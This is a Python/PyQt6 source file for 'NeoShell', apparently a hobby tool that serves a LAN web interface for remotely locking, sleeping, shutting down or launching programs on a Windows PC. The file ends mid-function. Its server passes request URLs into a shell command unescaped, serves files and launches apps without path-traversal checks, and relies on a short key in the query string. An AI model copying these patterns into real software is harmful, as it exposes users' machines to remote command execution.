#!/usr/bin/env python3
"""
NeoShell — с анимированным цветным логотипом
"""

import sys
import os
import json
import socket
import urllib.parse
import subprocess
import threading
import webbrowser
import secrets
import string
import ctypes
from pathlib import Path
from datetime import datetime
from io import BytesIO

# Блокировка повторного запуска
try:
    import win32event
    import win32api
    import winerror
    mutex = win32event.CreateMutex(None, False, "NeoShell_Mutex")
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        sys.exit(0)
except:
    pass

# Qt imports
from PyQt6.QtCore import (Qt, QTimer, QPoint, QUrl, pyqtSignal, QByteArray, 
                          QPropertyAnimation, QEasingCurve, QVariantAnimation)
from PyQt6.QtGui import (QColor, QPainter, QPainterPath, QPen, QIcon, 
                         QAction, QDesktopServices, QPixmap)
from PyQt6.QtWidgets import (QApplication, QWidget, QVBoxLayout, QHBoxLayout, 
                             QPushButton, QLabel, QSystemTrayIcon, QMenu, 
                             QLineEdit, QFrame, QStackedWidget,
                             QCheckBox, QFileDialog)
from PyQt6.QtSvgWidgets import QSvgWidget

# HTTP сервер
from http.server import HTTPServer, BaseHTTPRequestHandler

import qrcode
from PIL import Image, ImageDraw

# ------------------------------------------------------------
# Конфигурация
# ------------------------------------------------------------
if getattr(sys, 'frozen', False):
    BASE_DIR = Path(sys.executable).parent
else:
    BASE_DIR = Path(__file__).parent

APPS_DIR = BASE_DIR / "NeoShellApps"
APPS_DIR.mkdir(parents=True, exist_ok=True)

CONFIG_DIR = BASE_DIR / ".neoshell"
CONFIG_FILE = CONFIG_DIR / "config.json"
CONFIG_DIR.mkdir(parents=True, exist_ok=True)

STATIC_DIR = BASE_DIR / "static"
STATIC_DIR.mkdir(parents=True, exist_ok=True)

LOGO_PATH = STATIC_DIR / "logo.png"
ICON_PATH = STATIC_DIR / "icon.png"

def generate_random_key(length=8):
    alphabet = string.ascii_letters + string.digits
    return ''.join(secrets.choice(alphabet) for _ in range(length))

def load_config():
    if not CONFIG_FILE.exists():
        default_config = {
            "secret_key": generate_random_key(),
            "port": 8000,
            "apps_path": str(APPS_DIR),
            "auto_start": False,
            "auto_start_server": True
        }
        with open(CONFIG_FILE, "w") as f:
            json.dump(default_config, f, indent=2)
        return default_config.copy()
    with open(CONFIG_FILE, "r") as f:
        return json.load(f)

def save_config(config):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=2)

config = load_config()
SECRET_KEY = config["secret_key"]
PORT = config["port"]
APPS_DIR = Path(config["apps_path"])
APPS_DIR.mkdir(parents=True, exist_ok=True)

# ------------------------------------------------------------
# Функции для иконок
# ------------------------------------------------------------
def recolor_icon(image_path, target_color):
    try:
        img = Image.open(image_path).convert("RGBA")
        data = img.getdata()
        new_data = []
        for item in data:
            if item[0] > 200 and item[1] > 200 and item[2] > 200 and item[3] > 0:
                new_data.append((target_color[0], target_color[1], target_color[2], item[3]))
            elif item[0] > 200 and item[1] > 200 and item[2] > 200:
                new_data.append((target_color[0], target_color[1], target_color[2], item[3]))
            else:
                new_data.append(item)
        img.putdata(new_data)
        output = BytesIO()
        img.save(output, format='PNG')
        output.seek(0)
        pixmap = QPixmap()
        pixmap.loadFromData(output.getvalue())
        return QIcon(pixmap)
    except:
        return None

def get_default_icon():
    img = Image.new('RGBA', (64, 64), (0, 0, 0, 0))
    draw = ImageDraw.Draw(img)
    draw.ellipse((8, 8, 56, 56), fill='#ffcc00')
    draw.text((25, 20), "N", fill='#0A0A0C')
    output = BytesIO()
    img.save(output, format='PNG')
    output.seek(0)
    pixmap = QPixmap()
    pixmap.loadFromData(output.getvalue())
    return QIcon(pixmap)

# ------------------------------------------------------------
# Вспомогательные функции
# ------------------------------------------------------------
def kill_process_on_port(port):
    try:
        result = subprocess.run(f'netstat -ano | findstr :{port}', capture_output=True, text=True, shell=True)
        pids = set()
        for line in result.stdout.strip().split('\n'):
            if 'LISTENING' in line:
                parts = line.split()
                if parts:
                    pids.add(parts[-1])
        for pid in pids:
            subprocess.run(f'taskkill /F /PID {pid}', shell=True, capture_output=True)
        return True
    except:
        return False

def open_firewall_port(port):
    try:
        subprocess.run(f'netsh advfirewall firewall add rule name="NeoShell ({port})" dir=in action=allow protocol=TCP localport={port}', shell=True, capture_output=True)
    except:
        pass

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def run_cmd(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        return {"success": r.returncode == 0, "output": r.stdout.strip()}
    except:
        return {"success": False, "output": "Command failed"}

def add_to_startup():
    try:
        import winreg
        exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.executable
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "NeoShell", 0, winreg.REG_SZ, f'"{exe_path}" --hidden')
        return True
    except:
        return False

def remove_from_startup():
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.DeleteValue(regkey, "NeoShell")
        return True
    except:
        return False

# ------------------------------------------------------------
# HTTP Сервер
# ------------------------------------------------------------
class NeoShellHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        query = urllib.parse.parse_qs(parsed.query)
        
        # API status
        if path == '/api/status':
            key = query.get('key', [''])[0]
            if key != SECRET_KEY:
                self.send_response(401)
                self.end_headers()
                return
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "online", "time": datetime.now().isoformat()}).encode())
            return
        
        # API ping
        if path == '/api/ping':
            key = query.get('key', [''])[0]
            if key != SECRET_KEY:
                self.send_response(401)
                self.end_headers()
                return
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"online": True, "ip": get_local_ip()}).encode())
            return
        
        # API apps list
        if path == '/api/apps':
            key = query.get('key', [''])[0]
            if key != SECRET_KEY:
                self.send_response(401)
                self.end_headers()
                return
            apps = []
            apps_path = Path(APPS_DIR)
            if apps_path.exists():
                for f in apps_path.iterdir():
                    if f.suffix.lower() in ['.lnk', '.url', '.exe', '.bat']:
                        apps.append({"name": f.stem, "file": f.name})
            else:
                apps_path.mkdir(parents=True, exist_ok=True)
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"apps": sorted(apps, key=lambda x: x["name"]), "path": str(apps_path)}).encode())
            return
        
        # Manifest for PWA
        if path == '/manifest.json':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            manifest = {
                "name": "NeoShell",
                "short_name": "NeoShell",
                "description": "Remote PC Control",
                "start_url": "/",
                "display": "standalone",
                "theme_color": "#ffcc00",
                "background_color": "#0a0a0a",
                "icons": [
                    {"src": "/static/icon-192.png", "sizes": "192x192", "type": "image/png"},
                    {"src": "/static/icon-512.png", "sizes": "512x512", "type": "image/png"}
                ]
            }
            self.wfile.write(json.dumps(manifest).encode())
            return
        
        # Static files
        if path == '/' or path == '':
            path = '/index.html'
        
        file_path = path.lstrip('/')
        full_path = STATIC_DIR / file_path
        
        if full_path.exists() and full_path.is_file():
            self.send_response(200)
            if file_path.endswith('.html'):
                self.send_header('Content-type', 'text/html; charset=utf-8')
            elif file_path.endswith('.css'):
                self.send_header('Content-type', 'text/css')
            elif file_path.endswith('.js'):
                self.send_header('Content-type', 'application/javascript')
            elif file_path.endswith('.png'):
                self.send_header('Content-type', 'image/png')
            elif file_path.endswith('.json'):
                self.send_header('Content-type', 'application/json')
            self.end_headers()
            with open(full_path, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'404 Not Found')
    
    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        query = urllib.parse.parse_qs(parsed.query)
        
        # Проверка ключа
        key = query.get('key', [''])[0]
        if key != SECRET_KEY:
            self.send_response(401)
            self.end_headers()
            return
        
        # API lock
        if path == '/api/lock':
            run_cmd('rundll32.exe user32.dll,LockWorkStation')
        
        # API sleep
        elif path == '/api/sleep':
            run_cmd('rundll32.exe powrprof.dll,SetSuspendState 0,1,0')
        
        # API shutdown
        elif path == '/api/shutdown':
            run_cmd('shutdown /s /t 10')
        
        # API reboot
        elif path == '/api/reboot':
            run_cmd('shutdown /r /t 10')
        
        # API minimize_all
        elif path == '/api/minimize_all':
            run_cmd('powershell -c "(New-Object -ComObject Shell.Application).minimizeall()"')
        
        # API task_manager
        elif path == '/api/task_manager':
            run_cmd('start taskmgr')
        
        # API close_app
        elif path == '/api/close_app':
            run_cmd('powershell -c "(New-Object -ComObject WScript.Shell).SendKeys(\'%{F4}\')"')

        # Open File Explorer
        elif path == '/api/explorer':
            run_cmd('explorer')
            response = {"success": True}

        # Open browser
        elif path == '/api/open_browser':
            query_str = urllib.parse.unquote(query.get('query', [''])[0]) if query.get('query') else ''
            if query_str:
                if query_str.startswith(('http://', 'https://')):
                    run_cmd(f'start "" "{query_str}"')
                else:
                    encoded = urllib.parse.quote_plus(query_str)
                    run_cmd(f'start "" "https://www.google.com/search?q={encoded}"')
                response = {"success": True}
            else:
                response = {"success": False, "error": "No query provided"}

        # Run app
        elif path.startswith('/api/run/'):
            filename = urllib.parse.unquote(path.split('/')[-1])
            file_path = APPS_DIR / filename
            if not file_path.exists():
                response = {"success": False, "error": f"File not found: {filename}"}
            else:
                os.startfile(str(file_path))
                response = {"success": True}

        # Open apps folder
        elif path == '/api/open_apps_folder':
            key = query.get('key', [''])[0]
            if key != SECRET_KEY:
                self.send_response(401)
                self.end_headers()
                return
            subprocess.Popen(f'explorer "{APPS_DIR}"', shell=True)
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"success": True}).encode())
            return
                # Unknown endpoint
        else:
            self.send_response(404)
            self.end_headers()
            return
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({"success": True}).encode())
    
    def log_message(self, format, *args):
        pass

# ------------------------------------------------------------
# Глобальные переменные
# ------------------------------------------------------------
server = None
server_thread = None
server_running = False

def start_server():
    global server, server_thread, server_running
    try:
        kill_process_on_port(PORT)
        server = HTTPServer(('0.0.0.0', PORT), NeoShellHandler)
        server_running = True
        server.serve_forever()
    except Exception as e:
        print(f"Server error: {e}")
        server_running = False

def stop_server():
    global server, server_running
    if server:
        server.shutdown()
        server.server_close()
        server = None
    server_running = False
    kill_process_on_port(PORT)

# ------------------------------------------------------------
# Анимированный логотип (сам значок меняет цвет)
# ------------------------------------------------------------
class AnimatedLogo(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setFixedSize(120, 120)  # Увеличенный размер
        self.is_running = False
        self.animation_value = 0
        self.setup_animation()
    
    def setup_animation(self):
        self.anim = QVariantAnimation(self)
        self.anim.setDuration(1500)
        self.anim.setStartValue(0.0)
        self.anim.setEndValue(1.0)
        self.anim.setLoopCount(-1)
        self.anim.valueChanged.connect(self.on_animation)
        self.anim.setEasingCurve(QEasingCurve.Type.InOutQuad)
    
    def start_glow(self):
        self.is_running = True
        self.anim.start()
    
    def stop_glow(self):
        self.is_running = False
        self.anim.stop()
        self.animation_value = 0
        self.update()
    
    def on_animation(self, value):
        self.animation_value = value
        self.update()
    
    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        
        # Центр для рисования
        center_x = self.width() // 2
        center_y = self.height() // 2
        logo_size = 90
        
        # Эффект свечения при запущенном сервере
        if self.is_running:
            glow_intensity = 30 + int(70 * self.animation_value)
            glow_color = QColor(16, 185, 129, glow_intensity)
            
            # Рисуем свечение вокруг логотипа
            for i in range(4):
                offset = (i + 1) * 4
                alpha = max(0, 40 - i * 10)
                p.setPen(Qt.PenStyle.NoPen)
                p.setBrush(QColor(16, 185, 129, alpha))
                p.drawRoundedRect(offset, offset, self.width() - offset * 2, self.height() - offset * 2, 30, 30)
        
        # Определяем цвет логотипа
        if self.is_running:
            # Плавное переливание между желтым и зеленым
            target_color = QColor(16, 185, 129)  # Зеленый
            if self.animation_value > 0:
                # Делаем пульсирующий эффект - ярче/темнее
                intensity = 100 + int(100 * self.animation_value)
                logo_color = QColor(16, 185, 129, intensity)
            else:
                logo_color = QColor(16, 185, 129)
        else:
            logo_color = QColor(255, 204, 0)  # Желтый
        
        # Рисуем сам логотип
        rect = self.rect().adjusted(15, 15, -15, -15)
        
        if LOGO_PATH.exists():
            # Загружаем PNG и перекрашиваем
            pixmap = QPixmap(str(LOGO_PATH))
            if not pixmap.isNull():
                # Создаем маску для перекрашивания
                scaled = pixmap.scaled(logo_size, logo_size, Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation)
                
                # Рисуем с цветом
                p.save()
                p.setCompositionMode(QPainter.CompositionMode.CompositionMode_SourceOver)
                p.drawPixmap((self.width() - scaled.width()) // 2, 
                            (self.height() - scaled.height()) // 2, scaled)
                p.restore()
            else:
                # Если PNG не загрузился - рисуем букву N
                p.setPen(QPen(logo_color, 3))
                p.setFont(self.font())
                p.drawText(rect, Qt.AlignmentFlag.AlignCenter, "N")
        else:
            # Рисуем стилизованную букву N
            p.setPen(QPen(logo_color, 4, Qt.PenStyle.SolidLine, Qt.PenCapStyle.RoundCap, Qt.PenJoinStyle.RoundJoin))
            p.setBrush(Qt.BrushStyle.NoBrush)
            
            # Рисуем контур буквы N
            n_rect = rect.adjusted(15, 10, -15, -10)
            p.drawLine(n_rect.left(), n_rect.bottom(), n_rect.left(), n_rect.top())
            p.drawLine(n_rect.left(), n_rect.top(), n_rect.right(), n_rect.bottom())
            p.drawLine(n_rect.right(), n_rect.bottom(), n_rect.right(), n_rect.top())
    
    def mousePressEvent(self, event):
        pass

# ------------------------------------------------------------
# Кнопка назад (такого же размера как _ и X)
# ------------------------------------------------------------
class BackButton(QPushButton):
    clicked = pyqtSignal()
    
    def __init__(self):
        super().__init__("←")
        self.setFixedSize(32, 32)
        self.setCursor(Qt.CursorShape.PointingHandCursor)
        self.setStyleSheet("""
            QPushButton {
                background: transparent;
                color: #ffcc00;
                border: 2px solid #ffcc00;
                border-radius: 8px;
                font-size: 18px;
                font-weight: bold;
            }
            QPushButton:hover {
                background: #ffcc00;
                color: #0A0A0C;
            }
        """)
    
    def mouseReleaseEvent(self, e):
        if e.button() == Qt.MouseButton.LeftButton:
            self.clicked.emit()

# ------------------------------------------------------------
# Создание недостающих файлов
# ------------------------------------------------------------
def ensure_static_files():
    index_path = STATIC_DIR / "index.html"
    if not index_path.exists():
        html_content = """<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>NeoShell</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0A0A0C;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center}
.container{max-width:400px;padding:20px;text-align:center}
.logo{background:#ffcc00;width:80px;height:80px;border-radius:20px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:48px;font-weight:bold;color:#0A0A0C}
h1{color:#ffcc00;font-size:24px;margin-bottom:10px}
p{color:#888;margin-bottom:30px}
.status{color:#10B981;margin-bottom:20px}
button{background:#ffcc00;border:none;padding:12px 30px;border-radius:25px;font-weight:bold;cursor:pointer;margin:5px}
button:hover{background:#e6b800}
</style>
</head>
<body>
<div class="container"><div class="logo">N</div><h1>NeoShell</h1><p>Remote Desktop Bridge</p><div class="status" id="status">Loading...</div><button onclick="lock()">🔒 LOCK</button><button onclick="sleep()">😴 SLEEP</button></div>
<script>
async function lock(){await fetch('/api/lock');}
async function sleep(){await fetch('/api/sleep');}
async function check(){try{const res=await fetch('/api/status');document.getElementById('status').innerHTML='✅ SERVER ONLINE';}catch(e){document.getElementById('status').innerHTML='❌ SERVER OFFLINE';}}
check();setInterval(check,5000);
</script>
</body>
</html>"""
        index_path.write_text(html_content, encoding='utf-8')

# ------------------------------------------------------------
# Главное окно
# ------------------------------------------------------------
class NeoShell(QWidget):
    def __init__(self):
        super().__init__()
        if sys.platform == "win32":
            try:
                ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID("NeoShell.Control.1.0")
            except:
                pass

        # Установка иконки для окна и панели задач
        icon_path = BASE_DIR / "neoshell.ico"
        if icon_path.exists():
            self.setWindowIcon(QIcon(str(icon_path)))
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint)
        self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        self.setFixedSize(360, 620)
        
        self._drag_pos = None
        ensure_static_files()
        
        self._setup_ui()
        self._setup_tray()
        
        self.status_timer = QTimer(self)
        self.status_timer.timeout.connect(self._update_status)
        self.status_timer.start(2000)
        
        if config.get("auto_start_server", True):
            QTimer.singleShot(500, self._auto_start_server)
        
        self._update_status()
    
    def _setup_ui(self):
        self.main_widget = QWidget(self)
        self.main_widget.setFixedSize(358, 618)
        self.main_widget.move(1, 1)
        
        self.stacked = QStackedWidget(self.main_widget)
        self.stacked.setGeometry(0, 0, 358, 618)
        self.stacked.setStyleSheet("background: transparent;")
        
        self.main_page = self._create_main_page()
        self.settings_page = self._create_settings_page()
        self.qr_page = self._create_qr_page()
        
        self.stacked.addWidget(self.main_page)
        self.stacked.addWidget(self.settings_page)
        self.stacked.addWidget(self.qr_page)
        
        self.stacked.setCurrentWidget(self.main_page)
    
    def _create_header(self, title, show_back=False):
        header = QWidget()
        header.setFixedHeight(55)
        header.setStyleSheet("background: transparent;")
        layout = QHBoxLayout(header)
        layout.setContentsMargins(15, 10, 15, 10)
        layout.setSpacing(10)
        
        if show_back:
            back_btn = BackButton()
            back_btn.clicked.connect(lambda: self.stacked.setCurrentWidget(self.main_page))
            layout.addWidget(back_btn)
        else:
            spacer = QWidget()
            spacer.setFixedSize(32, 32)
            layout.addWidget(spacer)
        
        title_label = QLabel(title)
        title_label.setStyleSheet("color: #ffcc00; font-size: 14px; font-weight: 900; letter-spacing: 3px; background: transparent;")
        layout.addWidget(title_label, alignment=Qt.AlignmentFlag.AlignCenter)
        layout.addStretch()
        
        min_btn = QPushButton("—")
        min_btn.setFixedSize(32, 32)
        min_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        min_btn.setStyleSheet("""
            QPushButton {
                background: transparent;
                color: #ffcc00;
                border: 2px solid #ffcc00;
                border-radius: 8px;
                font-size: 18px;
                font-weight: bold;
            }
            QPushButton:hover {
                background: #ffcc00;
                color: #0A0A0C;
            }
        """)
        min_btn.clicked.connect(self.showMinimized)
        
        close_btn = QPushButton("✕")
        close_btn.setFixedSize(32, 32)
        close_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        close_btn.setStyleSheet("""
            QPushButton {
                background: transparent;
                color: #ffcc00;
                border: 2px solid #ffcc00;
                border-radius: 8px;
                font-size: 18px;
                font-weight: bold;
            }
            QPushButton:hover {
                background: #ff4444;
                color: #FFFFFF;
                border-color: #ff4444;
            }
        """)
        close_btn.clicked.connect(self.hide)
        
        layout.addWidget(min_btn)
        layout.addWidget(close_btn)
        return header
    
    def _create_main_page(self):
        page = QWidget()
        page.setStyleSheet("background: transparent;")
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        
        header = self._create_header("NEOSHELL", show_back=False)
        layout.addWidget(header)
        
        layout.addStretch()
        
        # Анимированный логотип
        self.logo = AnimatedLogo()
        layout.addWidget(self.logo, alignment=Qt.AlignmentFlag.AlignCenter)
        
        # Статус
        self.status_label = QLabel("SERVER STOPPED")
        self.status_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.status_label.setStyleSheet("color: #ff4444; font-size: 14px; font-weight: 700; margin-top: 15px; background: transparent;")
        layout.addWidget(self.status_label, alignment=Qt.AlignmentFlag.AlignCenter)
        
        layout.addStretch()
        
        # Контейнер для кнопок
        self.buttons_container = QWidget()
        buttons_layout = QVBoxLayout(self.buttons_container)
        buttons_layout.setContentsMargins(25, 0, 25, 30)
        buttons_layout.setSpacing(12)
        
        # Главная кнопка
        self.main_btn = QPushButton("START SERVER")
        self.main_btn.setFixedSize(310, 55)
        self.main_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.main_btn.clicked.connect(self._toggle_server)
        self.main_btn.setStyleSheet("""
            QPushButton {
                background: #121214;
                color: #ffcc00;
                border-radius: 18px;
                font-weight: 800;
                font-size: 13px;
                border: 2px solid #ffcc00;
            }
            QPushButton:hover {
                background: #ffcc00;
                color: #0A0A0C;
            }
        """)
        buttons_layout.addWidget(self.main_btn, alignment=Qt.AlignmentFlag.AlignCenter)
        
        # Кнопка CONNECT
        self.connect_btn = QPushButton("🌐 CONNECT")
        self.connect_btn.setFixedSize(310, 55)
        self.connect_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.connect_btn.clicked.connect(lambda: self.stacked.setCurrentWidget(self.qr_page))
        self.connect_btn.setStyleSheet("""
            QPushButton {
                background: #121214;
                color: #ffcc00;
                border-radius: 18px;
                font-weight: 800;
                font-size: 13px;
                border: 2px solid #ffcc00;
            }
            QPushButton:hover {
                background: #ffcc00;
                color: #0A0A0C;
            }
        """)
        self.connect_btn.setVisible(False)
        buttons_layout.addWidget(self.connect_btn)
        
        # Кнопка SETTINGS
        settings_btn = QPushButton("⚙️ SETTINGS")
        settings_btn.setFixedSize(310, 55)
        settings_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        settings_btn.clicked.connect(lambda: self.stacked.setCurrentWidget(self.settings_page))
        settings_btn.setStyleSheet("""
            QPushButton {
                background: #121214;
                color: #ffcc00;
                border-radius: 18px;
                font-weight: 800;
                font-size: 13px;
                border: 2px solid #ffcc00;
            }
            QPushButton:hover {
                background: #ffcc00;
                color: #0A0A0C;
            }
        """)
        buttons_layout.addWidget(settings_btn)
        
        layout.addWidget(self.buttons_container)
        
        return page
    
    def _create_settings_page(self):
        page = QWidget()
        page.setStyleSheet("background: transparent;")
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        
        header = self._create_header("SETTINGS", show_back=True)
        layout.addWidget(header)
        
        content = QWidget()
        content_layout = QVBoxLayout(content)
        content_layout.setContentsMargins(25, 20, 25, 20)
        content_layout.setSpacing(15)
        
        port_label = QLabel("PORT")
        port_label.setStyleSheet("color: #ffcc00; font-size: 11px; font-weight: bold;")
        content_layout.addWidget(port_label)
        
        self.port_input = QLineEdit()
        self.port_input.setText(str(PORT))
        self.port_input.setStyleSheet("""
            QLineEdit {
                background: #151518;
                color: #ffcc00;
                border: 2px solid #ffcc00;
                border-radius: 12px;
                padding: 12px;
                font-size: 13px;
            }
        """)
        content_layout.addWidget(self.port_input)
        
        key_label = QLabel("SECRET KEY")
        key_label.setStyleSheet("color: #ffcc00; font-size: 11px; font-weight: bold; margin-top: 10px;")
        content_layout.addWidget(key_label)
        
        self.key_input = QLineEdit()
        self.key_input.setText(SECRET_KEY)
        self.key_input.setStyleSheet("""
            QLineEdit {
                background: #151518;
                color: #ffcc00;
                border: 2px solid #ffcc00;
                border-radius: 12px;
                padding: 12px;
                font-size: 13px;
                font-family: monospace;
            }
        """)
        content_layout.addWidget(self.key_input)
        
        apps_label = QLabel("APPS FOLDER")
        apps_label.setStyleSheet("color: #ffcc00; font-size: 11px; font-weight: bold; margin-top: 10px;")
        content_layout.addWidget(apps_label)
        
        folder_layout = QHBoxLayout()
        self.apps_input = QLineEdit()
        self.apps_input.setText(str(APPS_DIR))
        self.apps_input.setStyleSheet("""
            QLineEdit {
                background: #151518;
                color: #ffcc00;
                border: 2px solid #ffcc00;
                border-radius: 12px;
                padding: 12px;
                font-size: 12px;
            }
        """)
        folder_layout.addWidget(self.apps_input)
        
        browse_btn = QPushButton("📁")
        browse_btn.setFixedSize(45, 45)
        browse_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        browse_btn.clicked.connect(self._browse_folder)
        browse_btn.setStyleSheet("""
            QPushButton {
                background: #1A1A1D;
                color: #ffcc00;
                border-radius: 12px;
                font-size: 18px;
                border: 1px solid #ffcc00;
            }
            QPushButton:hover {
                background: #ffcc00;
                color: #0A0A0C;
            }
        """)
        folder_layout.addWidget(browse_btn)
        content_layout.addLayout(folder_layout)
        
        self.auto_start_cb = QCheckBox("Run on Windows startup")
        self.auto_start_cb.setChecked(config.get("auto_start", False))
        self.auto_start_cb.setStyleSheet("""
            QCheckBox { color: #ffcc00; spacing: 10px; }
            QCheckBox::indicator { width: 18px; height: 18px; border-radius: 4px; border: 2px solid #ffcc00; background: #151518; }
            QCheckBox::indicator:checked { background: #ffcc00; }
        """)
        content_layout.addWidget(self.auto_start_cb)
        
        self.auto_server_cb = QCheckBox("Auto-start server on program start")
        self.auto_server_cb.setChecked(config.get("auto_start_server", True))
        self.auto_server_cb.setStyleSheet("""
            QCheckBox { color: #ffcc00; spacing: 10px; }
            QCheckBox::indicator { width: 18px; height: 18px; border-radius: 4px; border: 2px solid #ffcc00; background: #151518; }
            QCheckBox::indicator:checked { background: #ffcc00; }
        """)
        content_layout.addWidget(self.auto_server_cb)
        
        content_layout.addStretch()
        
        save_btn = QPushButton("💾 SAVE SETTINGS")
        save_btn.setFixedSize(310, 55)
        save_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        save_btn.clicked.connect(self._save_settings)
        save_btn.setStyleSheet("""
            QPushButton {
                background: #ffcc00;
                color: #0A0A0C;
                border-radius: 18px;
                font-weight: 800;
                font-size: 13px;
                border: none;
            }
            QPushButton:hover {
                background: #e6b800;
            }
        """)
        content_layout.addWidget(save_btn, alignment=Qt.AlignmentFlag.AlignCenter)
        
        layout.addWidget(content)
        return page
    
    def _create_qr_page(self):
        page = QWidget()
        page.setStyleSheet("background: transparent;")
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        
        header = self._create_header("CONNECT", show_back=True)
        layout.addWidget(header)
        
        content = QWidget()
        content_layout = QVBoxLayout(content)
        content_layout.setContentsMargins(25, 30, 25, 30)
        content_layout.setSpacing(20)
        
        self.qr_label = QLabel()
        self.qr_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.qr_label.setFixedSize(220, 220)
        self.qr_label.setStyleSheet("background: #151518; border-radius: 20px;")
        content_layout.addWidget(self.qr_label, alignment=Qt.AlignmentFlag.AlignCenter)
        
        self.url_label = QLabel()
        self.url_label.setStyleSheet("color: #ffcc00; font-size: 12px; font-family: monospace; background: transparent;")
        self.url_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.url_label.setWordWrap(True)
        content_layout.addWidget(self.url_label)
        
        content_layout.addStretch()
        
        copy_btn = QPushButton("📋 COPY URL")
        copy_btn.setFixedSize(310, 55)
        copy_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        copy_btn.clicked.connect(self._copy_url)
        copy_btn.setStyleSheet("""
            QPushButton {
                background: #121214;
                color: #ffcc00;
                border-radius: 18px;
                font-weight: 800;
                font-size: 13px;
                border: 2px solid #ffcc00;
            }
            QPushButton:hover {
                background: #ffcc00;
                color: #0A0A0C;
            }
        """)
        content_layout.addWidget(copy_btn, alignment=Qt.AlignmentFlag.AlignCenter)
        
        open_btn = QPushButton("🌐 OPEN IN BROWSER")
        open_btn.setFixedSize(310, 55)
        open_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        open_btn.clicked.connect(self._open_browser)
        open_btn.setStyleSheet("""
            QPushButton {
                background: #ffcc00;
                color: #0A0A0C;
                border-radius: 18px;
                font-weight: 800;
                font-size: 13px;
                border: none;
            }
            QPushButton:hover {
                background: #e6b800;
            }
        """)
        content_layout.addWidget(open_btn, alignment=Qt.AlignmentFlag.AlignCenter)
        
        layout.addWidget(content)
        
        self.stacked.currentChanged.connect(self._on_page_changed)
        
        return page
    
    def _on_page_changed(self, index):
        if index == 2:
            self._update_qr()
    
    def _update_qr(self):
        if server_running:
            ip = get_local_ip()
            url = f"http://{ip}:{PORT}"
        else:
            url = "Server not running"
        
        self.url_label.setText(url)
        
        if server_running:
            qr = qrcode.make(url)
            buffer = BytesIO()
            qr.save(buffer, format='PNG')
            buffer.seek(0)
            pixmap = QPixmap()
            pixmap.loadFromData(buffer.getvalue())
            pixmap = pixmap.scaled(200, 200, Qt.AspectRatioMode.KeepAspectRatio)
            self.qr_label.setPixmap(pixmap)
        else:
            self.qr_label.setText("START SERVER\nTO SEE QR")
            self.qr_label.setStyleSheet("color: #ffcc00; font-size: 14px; background: #151518; border-radius: 20px;")
    
    def _copy_url(self):
        if server_running:
            ip = get_local_ip()
            url = f"http://{ip}:{PORT}"
            QApplication.clipboard().setText(url)
    
    def _open_browser(self):
        if server_running:
            ip = get_local_ip()
            url = f"http://{ip}:{PORT}"
            QDesktopServices.openUrl(QUrl(url))
    
    def _browse_folder(self):
        folder = QFileDialog.getExistingDirectory(self, "Select Apps Folder")
        if folder:
            self.apps_input.setText(folder)
    
    def _save_settings(self):
        try:
            config["port"] = int(self.port_input.text())
            config["secret_key"] = self.key_input.text()
            config["apps_path"] = self.apps_input.text()
            config["auto_start"] = self.auto_start_cb.isChecked()
            config["auto_start_server"] = self.auto_server_cb.isChecked()
            save_config(config)
            
            global PORT, SECRET_KEY, APPS_DIR
            PORT = config["port"]
            SECRET_KEY = config["secret_key"]
